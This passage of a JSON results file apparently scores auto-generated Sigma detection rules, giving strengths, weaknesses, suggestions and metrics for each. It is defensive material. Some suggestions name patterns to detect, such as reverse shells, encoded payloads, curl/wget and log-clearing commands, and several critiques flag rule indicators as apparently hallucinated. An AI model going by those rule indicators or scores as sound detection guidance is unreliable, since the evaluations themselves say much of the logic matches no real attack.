        "weaknesses": [
          "Failed to detect the targeted attack in real-world verification (0 events found)",
          "Relies on literal string matching of 'socket_recv' and 'socket_send' in command line, which is unlikely in real malware",
          "Exclusion logic is flawed: requires *all* terms including 'python' and 'test', making it too restrictive and possibly ineffective",
          "No evidence the TTP involves command-line usage of 'socket_recv'/'socket_send' \u2014 likely a hallucination",
          "Lacks specificity in process names or image paths, increasing risk of evasion"
        ],
        "suggestions": [
          "Revise detection logic to look for suspicious parent-child process chains (e.g., Office process spawning PowerShell with network activity)",
          "Use Sysmon Event ID 3 (network connection) instead of process creation, or correlate both",
          "Base detection on actual known malicious behaviors or IoCs from the TTP, not synthetic keywords",
          "Improve exclusions with named processes or signed binaries",
          "Validate rule logic against real attack data or threat intelligence before deployment"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malicious Shell Execution via Command and Scripting Interpreter",
        "rule_id": "unknown",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule targets specific suspicious paths like 'SpectralBlur/.macshare', which are indicative of malicious behavior",
          "Excludes common benign parent processes to reduce false positives, showing contextual awareness",
          "Uses precise field conditions (Image ends with /bin/sh, CommandLine contains path) that are efficient for querying",
          "Well-documented false positives, aiding analysts in tuning and triage",
          "Tags align with MITRE ATT&CK framework (T1059), supporting threat intelligence integration"
        ],
        "weaknesses": [
          "Failed to detect the actual attack in real-world verification (0 events found), indicating poor detection coverage",
          "Relies on a very specific path ('SpectralBlur/.macshare') which may be easily modified by adversaries, limiting generalization",
          "Verification result shows no detection despite successful query execution, suggesting the logic may not reflect real attack patterns",
          "The TTP ID is listed as 'unknown', reducing traceability and confidence in alignment with known threats"
        ],
        "suggestions": [
          "Broaden detection logic to include other shell interpreters (e.g., bash, zsh) and obfuscation techniques",
          "Use regular expressions or wildcards to detect variations of suspicious paths instead of exact string match",
          "Incorporate behavioral indicators such as child processes, network connections, or file writes post-execution",
          "Validate rule against multiple attack simulations to ensure consistent detection",
          "Ensure TTP mapping is accurate and up-to-date with real adversary tactics"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "File and Directory Permissions Modification via Malicious File Access",
        "rule_id": "unknown",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets specific suspicious file paths commonly associated with malware hiding in shared directories",
          "It focuses on high-risk command-line utilities (chmod, chown) with dangerous permission modifiers like 777, +x, a+rwx",
          "Includes relevant false positives in documentation, showing awareness of operational impact",
          "Efficient use of indexed fields (TargetFilename, Image, CommandLine) likely enables fast query performance"
        ],
        "weaknesses": [
          "Failed to detect any real-world events during verification, indicating poor coverage or mismatch with actual attack behavior",
          "Rule may be too specific to hardcoded filenames (.macshare, macshare.d), which are not part of standard TTP and could be easily changed by attackers",
          "No mention of adversary behavior beyond file names; lacks indicators like user context, parent process, or network correlation",
          "TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE framework"
        ],
        "suggestions": [
          "Broaden detection logic to include behavioral patterns beyond hardcoded paths (e.g., any hidden file in /Users/Shared modified with permissive permissions)",
          "Add process ancestry checks (e.g., Terminal, script interpreter) to increase confidence",
          "Incorporate user context (e.g., non-admin user running chmod -R 777) to reduce false positives and improve detection fidelity",
          "Validate rule against known malware samples that abuse file permissions on macOS",
          "Update TTP mapping with correct MITRE ATT&CK ID and tactic (e.g., Privilege Escalation, Defense Evasion) for better alignment"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malware Using xcrypt Function for Data Encryption",
        "rule_id": "unknown",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant behavior (use of 'xcrypt' or 'custom stream cipher' in command lines) associated with data encryption in malware",
          "Log source is well-defined using Sysmon process creation on Windows, which is appropriate for detecting malicious command-line activity",
          "Includes documented false positives, showing awareness of potential noise"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0), indicating poor detection coverage against the intended TTP",
          "Highly generic string matching may miss variations or obfuscated commands",
          "No use of regex or case-insensitive matching to improve robustness",
          "Relies solely on literal string matches which are easily bypassed"
        ],
        "suggestions": [
          "Enhance detection logic with case-insensitive matching (e.g., use 'icontains' instead of 'contains')",
          "Add regex patterns to catch obfuscated or encoded variants of 'xcrypt' and 'custom stream cipher'",
          "Incorporate additional indicators such as parent-child process anomalies or known malicious command-line arguments",
          "Validate rule against real attack datasets (e.g., Atomic Red Team tests for T1560) to improve detection fidelity",
          "Consider enriching with context like image path or user context to reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Hollowing via fork and posix_openpt",
        "rule_id": "unknown",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Clear and concise title and description describing the intended behavior.",
          "Appropriate MITRE ATT&CK tags (defense_evasion, T1055.012).",
          "Simple query logic that is easy to understand and maintain.",
          "Includes a false\u2011positive rationale to aid analysts.",
          "Provides SIEM verification metadata for traceability."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world instances of the technique (0 events), indicating poor detection coverage.",
          "Condition requires both \"fork\" and \"posix_openpt\" in the same command line, which is rarely seen in legitimate process\u2011hollowing attacks.",
          "High likelihood of false positives because many legitimate development, debugging, and system utilities use fork() and posix_openpt independently.",
          "No correlation of parent\u2011child process relationships; the rule does not verify that a forked child subsequently calls posix_openpt.",
          "Missing explicit MITRE technique ID (ttp_id is \"unknown\"), reducing usefulness for mapping and reporting.",
          "No enrichment fields (e.g., process ID, parent process ID) that could help reduce noise."
        ],
        "suggestions": [
          "Refine the detection logic to capture a sequence of events: first a fork (or clone) event, then a subsequent posix_openpt call in the child process, using parent\u2011child relationship fields.",
          "Consider using an OR condition with additional constraints (e.g., specific suspicious binaries, unusual command\u2011line arguments) to broaden coverage while adding filters to limit noise.",
          "Add the official MITRE ATT&CK technique ID (T1055.012) to the ttp_id field for proper mapping.",
          "Incorporate process metadata such as PID, PPID, and executable name to enable correlation and reduce false positives.",
          "Test the rule against a labeled dataset of known process\u2011hollowing activity to tune thresholds and validate detection coverage.",
          "Document any assumptions about the environment (e.g., typical development tools) and possibly whitelist known benign processes that frequently use fork and posix_openpt."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malware Create or Modify System Process via proc_testconn Function",
        "rule_id": "unknown",
        "quality_score": 0.575,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description describing the intended malicious behavior.",
          "Targets Sysmon process_creation events, which provide reliable command\u2011line visibility.",
          "Includes a list of known false\u2011positive scenarios to aid analysts.",
          "Provides ATT&CK tags and a verification block indicating that the rule has been tested in the SIEM."
        ],
        "weaknesses": [
          "The rule failed to detect any events in the real\u2011world verification, indicating poor detection coverage.",
          "The condition requires BOTH the string \"proc_testconn\" AND one of the tool names, which is an overly strict AND logic that rarely occurs in practice.",
          "Reliance on a single, obscure keyword (\"proc_testconn\") that is not documented in known malware or ATT&CK techniques.",
          "Missing optional but useful metadata such as author, creation date, references, and mitigation guidance.",
          "No additional context fields (e.g., ParentImage, User, IntegrityLevel) that could improve confidence and reduce false positives."
        ],
        "suggestions": [
          "Relax the condition to use OR logic (e.g., \"selection_proc_testconn OR selection_tools\") or create separate rules for each indicator.",
          "Add broader command\u2011line patterns related to process creation/manipulation (e.g., \"CreateProcess\", \"CreateRemoteThread\", \"sc.exe\", \"reg add\", etc.).",
          "Incorporate additional Sysmon fields such as ParentImage, Image, and User to provide richer context and enable more precise filtering.",
          "Document the source or evidence for the \"proc_testconn\" indicator to justify its inclusion and aid future tuning.",
          "Include author, creation date, version, and reference links to improve rule provenance and maintainability.",
          "Test the rule against a representative set of benign and malicious samples to calibrate detection coverage and false\u2011positive rates.",
          "Consider adding a threshold or aggregation (e.g., multiple occurrences within a short time window) to reduce noise."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Creation with Suspicious System Calls and Command-Line Tools",
        "rule_id": "unknown",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description describing the intent of the rule.",
          "Uses standard Sigma fields (title, description, logsource, detection, falsepositives, level, tags).",
          "Provides a list of expected false positives to aid analysts.",
          "Simple query logic (contains operators) that is easy to understand and maintain."
        ],
        "weaknesses": [
          "The rule failed to detect any events in the verification run, indicating poor detection coverage for the intended technique.",
          "High likelihood of false positives because execve and fork appear in virtually all legitimate Linux processes.",
          "Inclusion of Windows\u2011specific tools (wmic, schtasks, bitsadmin) in a Linux process_creation logsource is inconsistent and may never match.",
          "ATT&CK identifiers are incomplete/incorrect (e.g., attack.t1566 is unrelated to process creation, ttp_id is \"unknown\").",
          "No filtering on process name, parent process, or command\u2011line context, which would help reduce noise."
        ],
        "suggestions": [
          "Remove or replace the Windows\u2011only command\u2011line checks with Linux\u2011relevant tools (e.g., curl, wget, bash, python).",
          "Add additional conditions to narrow the scope, such as specific executable names (e.g., /bin/bash, /usr/bin/python) combined with suspicious arguments.",
          "Incorporate regex patterns to detect known malicious command\u2011line arguments (e.g., base64\u2011encoded payloads, reverse shells).",
          "Include the proper ATT&CK technique ID for Process Creation (e.g., T1059.003 for Linux Command Shell) and remove unrelated tags.",
          "Consider adding a filter on parent process or user context to differentiate normal system processes from anomalous activity.",
          "Test the rule against a labeled dataset of benign and malicious process creation events to calibrate thresholds and reduce false positives."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malware Data Staging via proc_upload and proc_download Functions",
        "rule_id": "unknown",
        "quality_score": 0.475,
        "status": "fail",
        "strengths": [
          "Simple, easy\u2011to\u2011understand condition (proc_upload OR proc_download).",
          "Targets Sysmon process_creation events, which are reliably collected on Windows.",
          "Provides explicit false\u2011positive guidance in the rule metadata.",
          "Includes verification metadata (siem_verification) showing that the rule was tested.",
          "Assigns a high severity level, drawing attention to potential exfiltration activity."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world instances; detection coverage is very low.",
          "Reliance on exact string \"proc_upload\" / \"proc_download\" leads to many legitimate scripts being flagged, increasing false positives.",
          "No contextual enrichment (e.g., process name, parent process, file paths, network activity) to confirm malicious intent.",
          "ATT&CK tag \"attack.T1566\" (Phishing) does not match the Data Staging technique, indicating a tagging error.",
          "Missing standard Sigma fields such as author, date, version, and a proper ATT&CK technique ID.",
          "The rule does not include any thresholding or aggregation to reduce noise from repeated benign executions."
        ],
        "suggestions": [
          "Add additional indicators of data staging, such as creation of temporary staging directories, large file writes, or use of known staging tools.",
          "Incorporate process metadata (e.g., Image, ParentImage, CommandLine arguments) to filter out known legitimate utilities that may contain the strings.",
          "Replace the generic \"contains\" operator with a case\u2011insensitive regex that matches whole word boundaries to avoid partial matches.",
          "Correct the ATT&CK tagging: use the proper technique ID for Data Staging (e.g., T1074) and remove unrelated T1566 tag.",
          "Populate missing Sigma metadata (author, date, version, proper ATT&CK ID) to improve rule provenance and maintainability.",
          "Implement a baseline or threshold (e.g., flag only if the same process runs multiple times within a short window) to lower false positives.",
          "Test the rule against a broader dataset of benign and malicious samples to fine\u2011tune the detection logic before deployment."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Indicator Removal on Host via proc_rmfile Function",
        "rule_id": "unknown",
        "quality_score": 0.78,
        "status": "pass",
        "strengths": [
          "The rule successfully detected the test events (57 matches) confirming functional detection.",
          "Clear and concise description of the technique being monitored.",
          "Uses a simple \"contains\" filter on CommandLine, which is easy to understand and maintain.",
          "Includes sensible exclusions for known legitimate tools (wmic, schtasks, bitsadmin) and common parent processes.",
          "Verification metadata (siem_verification) is provided, showing query execution time of only 356\u202fms, indicating good performance.",
          "Appropriate MITRE ATT&CK tag (attack.T1070.004) is attached."
        ],
        "weaknesses": [
          "Detection relies on a single literal string \"proc_rmfile\"; any variation or obfuscation will bypass the rule.",
          "The rule does not reference a concrete MITRE ATT&CK technique ID (attack_id is a UUID, ttp_id is \"unknown\").",
          "Potential for false positives if custom maintenance scripts or third\u2011party utilities use the same function name, which is only partially mitigated by the exclusions.",
          "The generation_method is listed as \"langchain\", suggesting the rule may be auto\u2011generated without thorough manual review.",
          "No additional context fields (e.g., User, ParentCommandLine) are captured, limiting investigative depth."
        ],
        "suggestions": [
          "Expand the detection to include other known indicator\u2011removal commands (e.g., \"cipher /w\", \"wevtutil cl\", PowerShell \"Remove-Item\") and generic file\u2011deletion patterns.",
          "Add more granular exclusions, such as known legitimate scripts or scheduled tasks that may legitimately invoke proc_rmfile.",
          "Replace the placeholder MITRE identifiers with the proper ATT&CK technique ID (T1070.004) in the attack_id field.",
          "Consider adding enrichment fields (e.g., InitiatingUser, ParentCommandLine) to aid triage and reduce investigation time.",
          "Validate the rule against a broader dataset of benign activity to quantify the actual false\u2011positive rate and adjust exclusions accordingly.",
          "Document the source of the \"proc_rmfile\" indicator (e.g., specific malware family) to improve analyst confidence."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "File and Directory Discovery via proc_dir and Common CLI Tools",
        "rule_id": "unknown",
        "quality_score": 0.8,
        "status": "pass",
        "strengths": [
          "Successfully detects the targeted File and Directory Discovery technique (verified with 46 events).",
          "Excludes common parent processes (cmd.exe, services.exe) to reduce obvious false positives.",
          "Uses Sysmon process_creation events, which provide detailed command line information.",
          "Clear and concise condition logic that is easy to understand and maintain.",
          "Verification metadata (query time, status) is included, demonstrating practical testing."
        ],
        "weaknesses": [
          "Potential false positives from legitimate administrative scripts that legitimately use wmic, schtasks, or bitsadmin.",
          "Limited to only three CLI utilities; many other native Windows tools (e.g., powershell, cmd \"dir\", explorer) can also perform discovery.",
          "Relies on ParentImage exclusions that may miss cases where the parent is powershell.exe, wscript.exe, or other legitimate wrappers.",
          "The rule references a custom \"proc_dir.exe\" which is uncommon and may not exist in many environments, reducing real\u2011world relevance.",
          "MITRE ATT&CK identifier is expressed as \"attack.t1083\" (old format) and the ttp_id field is set to \"unknown\", which hampers taxonomy integration.",
          "Generation method listed as \"langchain\" suggests the rule may be auto\u2011generated without manual review, raising risk of subtle errors."
        ],
        "suggestions": [
          "Broaden the detection set to include additional native discovery utilities such as powershell.exe (Get-ChildItem), cmd.exe \"dir\", explorer.exe, and built\u2011in Windows APIs.",
          "Add exclusions for other legitimate parent processes (e.g., powershell.exe, wscript.exe) or use a whitelist of known benign scripts.",
          "Consider using regular expressions on the CommandLine field to capture typical discovery patterns (e.g., \"dir\", \"ls\", \"Get-ChildItem\").",
          "Replace the placeholder \"proc_dir.exe\" with a more realistic indicator or remove it if not applicable.",
          "Update the MITRE ATT&CK tagging to use the current technique ID (T1083) and populate the ttp_id field with the official identifier.",
          "Perform a baseline analysis on normal administrative activity to quantify the false positive rate and adjust the rule accordingly.",
          "Document the rationale for each exclusion and include a severity mapping to align with organizational response processes."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection of System Network Connections Discovery via Command-line Tools",
        "rule_id": "unknown",
        "quality_score": 0.75,
        "status": "pass",
        "strengths": [
          "Covers a variety of common network\u2011discovery utilities (netstat, wmic, schtasks, bitsadmin, PowerShell).",
          "Specific detection for PowerShell Get\u2011NetTCPConnection cmdlet, which is a direct indicator of the technique.",
          "Excludes processes launched from cmd.exe to reduce obvious noise.",
          "Provides concrete verification data (42 events detected, successful query) demonstrating that the rule works in the target SIEM.",
          "Includes a clear false\u2011positive description to aid analysts."
        ],
        "weaknesses": [
          "Potentially high false\u2011positive rate for legitimate admin troubleshooting (netstat, wmic, schtasks, bitsadmin are frequently used).",
          "Missing other common discovery commands (e.g., netsh, ipconfig, Get\u2011NetIPConfiguration) that could also indicate the technique.",
          "Relies on exact image suffix matching; renamed or moved binaries will evade detection.",
          "The \"selection_socket\" condition (CommandLine contains \"socket_connect\") is vague and may never match real activity.",
          "No enrichment with user, host, or event\u2011ID context to help prioritize alerts."
        ],
        "suggestions": [
          "Add detection for additional network\u2011discovery tools such as netsh, ipconfig, and PowerShell cmdlets like Get\u2011NetIPConfiguration or Get\u2011NetAdapter.",
          "Incorporate argument\u2011level filtering (e.g., netstat with \"-a\" or \"-n\" flags) to differentiate routine usage from suspicious enumeration.",
          "Consider using parent\u2011process chains beyond cmd.exe (e.g., exclude known legitimate automation tools) to further reduce noise.",
          "Add contextual fields (e.g., EventID 4688, user account, source IP) and implement a threshold or aggregation (multiple discovery commands within a short window) to raise the alert\u2019s severity.",
          "Review and refine the \"selection_socket\" pattern to match actual socket\u2011related command lines or replace it with a more reliable indicator."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection of System Information Discovery via gethostbyname, getlogin, and common discovery utilities",
        "rule_id": "unknown",
        "quality_score": 0.78,
        "status": "pass",
        "strengths": [
          "Verification in the SIEM succeeded with 44 matching events, demonstrating that the rule can detect the intended technique.",
          "Combines multiple indicators (function calls and specific discovery utilities) to broaden coverage.",
          "Excludes common interactive parent processes (explorer.exe, cmd.exe, powershell.exe) to reduce obvious false positives.",
          "Simple field filters (contains, endswith) keep the query lightweight (\u2248527\u202fms)."
        ],
        "weaknesses": [
          "Relies heavily on parent\u2011process exclusion; legitimate admin scripts that launch wmic/schtasks/bitsadmin from other parents will still trigger alerts.",
          "Limited to a small set of utilities; many other discovery commands (e.g., systeminfo, hostname, ipconfig, netsh) are not covered.",
          "The gethostbyname/getlogin selections are based on raw command\u2011line text, which is rarely present in typical Windows command lines, reducing practical relevance.",
          "Potential for false positives from routine maintenance scripts that legitimately use the listed utilities.",
          "No allow\u2011list for known benign automation tools or scheduled tasks that may invoke these binaries."
        ],
        "suggestions": [
          "Expand the utility list to include other common discovery binaries (systeminfo.exe, hostname.exe, ipconfig.exe, netsh.exe, wmic queries via PowerShell, etc.).",
          "Add detection of PowerShell cmdlets that perform discovery (e.g., Get\u2011ComputerInfo, Get\u2011WmiObject, Get\u2011CimInstance).",
          "Refine the parent\u2011process filter: consider allowing known automation or orchestration tools (e.g., SCCM, Ansible) while still flagging unusual parent\u2011child relationships.",
          "Incorporate argument\u2011level detection (e.g., wmic /node:*, schtasks /query) to focus on suspicious usage patterns.",
          "Create an explicit allow\u2011list for scheduled tasks or maintenance scripts that are known to use these utilities, reducing noise.",
          "Consider adding a threshold on frequency or anomalous timing (e.g., many discovery commands within a short window) to improve signal\u2011to\u2011noise ratio."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection of System Network Configuration Discovery via getsockopt and Common Admin Tools",
        "rule_id": "unknown",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "Detects multiple legitimate network\u2011discovery utilities (wmic, schtasks, bitsadmin) in a single rule.",
          "Includes a specific detection for the getsockopt API call, covering programmatic discovery attempts.",
          "Excludes common interactive shells (cmd.exe, powershell.exe) as parents, reducing obvious false positives.",
          "Verification data shows successful detection (46 events) with a fast query time (~373\u202fms).",
          "Well\u2011structured Sigma rule with clear description, tags, and false\u2011positive guidance."
        ],
        "weaknesses": [
          "Potential false positives from legitimate administrative scripts that legitimately use wmic, schtasks, or bitsadmin.",
          "Getsockopt detection via a simple \"contains\" may trigger on benign applications that use the API for normal networking.",
          "Rule does not cover native Windows network\u2011discovery commands such as ipconfig or netsh, which are mentioned in the false\u2011positive list but not detected.",
          "Parent\u2011process exclusion only checks cmd.exe and powershell.exe; other legitimate parent processes (e.g., task scheduler, remote management tools) could still generate noise.",
          "The rule lacks a concrete MITRE ATT&CK technique ID (ttp_id is \"unknown\")."
        ],
        "suggestions": [
          "Add detections for additional native network\u2011discovery tools (e.g., ipconfig.exe, netsh.exe) to broaden coverage.",
          "Refine the getsockopt condition (e.g., require additional indicators such as suspicious command\u2011line arguments or unusual parent processes) to reduce noise.",
          "Consider whitelisting known legitimate administrative scripts or adding a confidence score based on user context (e.g., privileged accounts).",
          "Include the official ATT&CK technique ID (T1016) in the ttp_id field for better mapping and reporting.",
          "Expand parent\u2011process exclusions to cover other common automation hosts (e.g., taskeng.exe, wscript.exe) while ensuring legitimate use cases are not missed.",
          "Document expected baseline frequency for each selection to help SOC analysts triage alerts more effectively."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "System Owner/User Discovery via getpwuid and System Utilities",
        "rule_id": "unknown",
        "quality_score": 0.63,
        "status": "fail",
        "strengths": [
          "Verification shows the rule successfully detected 52 relevant events.",
          "Excludes executions launched from common command shells (cmd.exe, powershell.exe) to reduce obvious false positives.",
          "Clear and concise detection logic using simple field matches (endswith, contains).",
          "Provides a detailed false\u2011positive description to aid analysts."
        ],
        "weaknesses": [
          "Logsource is set to Linux/sysmon but includes Windows utilities (wmic.exe, schtasks.exe, bitsadmin.exe) that will never appear on Linux hosts.",
          "Missing several required Sigma metadata fields (e.g., id, author, date, status), reducing rule completeness.",
          "Only matches Python processes for getpwuid, ignoring other languages or native binaries that could call the same function.",
          "Potential for false positives from legitimate Python scripts that perform user look\u2011ups or admin scripts that use the listed Windows utilities.",
          "Parent\u2011process exclusions may miss malicious activity that is legitimately launched from a shell, reducing detection scope."
        ],
        "suggestions": [
          "Add the missing mandatory Sigma fields (id, author, date, etc.) to improve rule completeness and portability.",
          "Adjust the logsource or split the rule into separate Linux and Windows variants so that Windows utility detections are applied to Windows log sources.",
          "Broaden the Linux detection to include other interpreters (bash, perl, ruby) and native binaries that may invoke getpwuid or similar system calls.",
          "Refine the Windows utility selections with command\u2011line argument patterns (e.g., wmic /node:*, schtasks /query) to reduce noise from benign usage.",
          "Consider adding a whitelist of known legitimate scripts or scheduled tasks to further lower the false\u2011positive rate.",
          "Document the expected environment (e.g., Sysmon on Windows vs. auditd on Linux) to avoid mismatched deployments."
        ],
        "metrics": {
          "accuracy": 0.7,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Window Discovery via proc_none and Common Enumeration Tools",
        "rule_id": "unknown",
        "quality_score": 0.75,
        "status": "pass",
        "strengths": [
          "Detects multiple known enumeration utilities (wmic, schtasks, bitsadmin) and a custom proc_none executable.",
          "Includes parent process exclusions to reduce obvious benign noise.",
          "Verification in the SIEM succeeded with 53 matching events and a fast query time (~350\u202fms).",
          "All required Sigma fields are present and correctly formatted.",
          "Clear documentation of potential false positives in the rule metadata."
        ],
        "weaknesses": [
          "Relies on a narrow set of executables; other tools or scripts that perform Application Window Discovery will not be caught.",
          "Parent exclusions (cmd.exe, services.exe) may inadvertently suppress malicious activity launched from legitimate parent processes.",
          "High likelihood of false positives from legitimate administrative use of wmic, schtasks, and bitsadmin.",
          "No command\u2011line pattern matching for wmic/schtasks/bitsadmin, reducing specificity.",
          "MITRE ATT&CK identifiers are incomplete (technique ID marked as \"unknown\").",
          "Rule appears auto\u2011generated (generation_method: \"langchain\"), which may affect quality of wording and coverage."
        ],
        "suggestions": [
          "Add command\u2011line keyword filters (e.g., \"process list\", \"window\", \"enum\") to increase specificity for enumeration activity.",
          "Include additional known utilities or PowerShell cmdlets that can enumerate windows (e.g., Get-Process, Get-Window).",
          "Refine parent exclusions to allow legitimate admin tools while still filtering common benign launches (e.g., exclude only when ParentImage is cmd.exe *and* CommandLine matches known benign patterns).",
          "Populate the correct MITRE ATT&CK technique ID (T1010) and ensure the tactic field is filled (Discovery).",
          "Perform a baseline analysis on typical enterprise traffic to quantify the false\u2011positive rate and adjust the rule accordingly.",
          "Consider adding a correlation with suspicious behavior (e.g., rapid successive calls, unusual parent\u2011child relationships) to improve detection confidence."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "System Time Discovery via Command-Line Tools",
        "rule_id": "unknown",
        "quality_score": 0.78,
        "status": "pass",
        "strengths": [
          "Covers several common command\u2011line utilities used for time discovery (cmd.exe, powershell.exe, wmic.exe, schtasks.exe, bitsadmin.exe).",
          "Verification data shows the rule successfully detected real events (52 matches, query time <\u202f1\u202fs).",
          "Clear, concise description and well\u2011structured metadata (title, description, tags, false\u2011positive notes).",
          "Includes an explicit exclusion to reduce noise from parent cmd.exe processes."
        ],
        "weaknesses": [
          "Limited to a narrow set of command\u2011line patterns; does not cover other legitimate time\u2011discovery commands such as `date`, `time /t`, `net time`, `w32tm`, or PowerShell aliases like `Get-LocalDateTime`.",
          "Potential for false positives from routine administrative scripts, scheduled\u2011task queries, or system utilities that legitimately use the listed arguments.",
          "The `exclude_parent` condition only filters when the parent image is cmd.exe, leaving many other benign parent processes (e.g., PowerShell, task scheduler) that could still generate noise.",
          "`bitsadmin.exe` with `/util` is not a typical time\u2011discovery flag, which may increase irrelevant matches.",
          "No use of case\u2011insensitive matching or regex to capture variations (e.g., `Get\u2011Date -UFormat`, extra whitespace, quoted arguments)."
        ],
        "suggestions": [
          "Add additional command\u2011line patterns for other common time\u2011discovery utilities (`date`, `time /t`, `net time`, `w32tm`, PowerShell aliases).",
          "Refine the exclusion logic to also ignore known legitimate parent processes (e.g., PowerShell, task scheduler) or to require a minimum confidence score.",
          "Replace simple `contains` checks with case\u2011insensitive regexes to capture variations and avoid missing detections due to spacing or quoting.",
          "Consider correlating the time\u2011discovery process with subsequent actions (e.g., credential dumping, lateral movement) to increase the rule\u2019s specificity.",
          "Document and maintain a whitelist of approved scripts or scheduled tasks that routinely query the system time to reduce false positives."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "File Deletion via Unlink API or Proc_Rmfile Function",
        "rule_id": "unknown",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "Verification data shows the rule successfully detected 54 relevant events, confirming good coverage of the File Deletion technique.",
          "Covers multiple common deletion utilities (cmd.exe/unlink, PowerShell/proc_rmfile, wmic.exe, schtasks.exe, bitsadmin.exe).",
          "Includes a simple benign\u2011parent exclusion (explorer.exe) to reduce obvious false positives.",
          "Provides clear false\u2011positive descriptions and a high severity level (high).",
          "All mandatory Sigma fields (title, description, logsource, detection, condition, falsepositives, level, tags) are present."
        ],
        "weaknesses": [
          "The \"proc_rmfile\" identifier is not a native Windows PowerShell function; its inclusion appears to be a hallucination and may never match real events.",
          "Relying on the literal string \"unlink\" in cmd.exe command lines is uncommon on Windows, limiting detection of other legitimate delete APIs (e.g., DeleteFile, Remove-Item).",
          "Only one benign\u2011parent exclusion (explorer.exe) is used; many legitimate administrative scripts are launched from other parents (e.g., taskschd.exe, msiexec.exe), leading to potential false positives.",
          "The rule does not filter on Sysmon Event IDs (e.g., EventID 1 for process creation), which could improve performance and precision.",
          "No context about the file paths being deleted; without path filtering the rule may trigger on benign cleanup operations."
        ],
        "suggestions": [
          "Replace or supplement the \"proc_rmfile\" condition with realistic Windows PowerShell commands such as \"Remove-Item\" or \"del\".",
          "Add detection for the native Windows DeleteFile API (e.g., command lines containing \"DeleteFile\" or Sysmon EventID 1 with Image ending in \"\\ntdll.dll\" and a DeleteFile call).",
          "Expand the benign\u2011parent list to include common administrative parents (e.g., taskschd.exe, msiexec.exe, svchost.exe) and consider adding a whitelist of known maintenance scripts.",
          "Incorporate Sysmon EventID filtering (e.g., EventID 1) to limit the rule to process\u2011creation events only, improving query efficiency.",
          "Introduce optional path\u2011based filters (e.g., exclude %TEMP% or Windows system directories) to reduce noise from routine cleanup tasks.",
          "Consider using regular expressions for command\u2011line matching to capture variations (e.g., \"\\b(delete|del|remove-item)\\b\")."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection of Input Capture via proc_getcfg and Common Command-line Tools",
        "rule_id": "unknown",
        "quality_score": 0.75,
        "status": "pass",
        "strengths": [
          "Detects the specific proc_getcfg function and three commonly abused utilities (wmic, schtasks, bitsadmin).",
          "Excludes executions launched from typical benign parent processes, reducing obvious noise.",
          "Real\u2011world verification shows successful detection (59 events) with a fast query time (\u2248\u202f367\u202fms).",
          "Clear description, tags, and false\u2011positive documentation."
        ],
        "weaknesses": [
          "Relies heavily on parent\u2011process exclusion; legitimate use of the listed tools from other parents will still trigger alerts.",
          "Potentially high false\u2011positive volume from normal administrative scripts that use wmic, schtasks, or bitsadmin.",
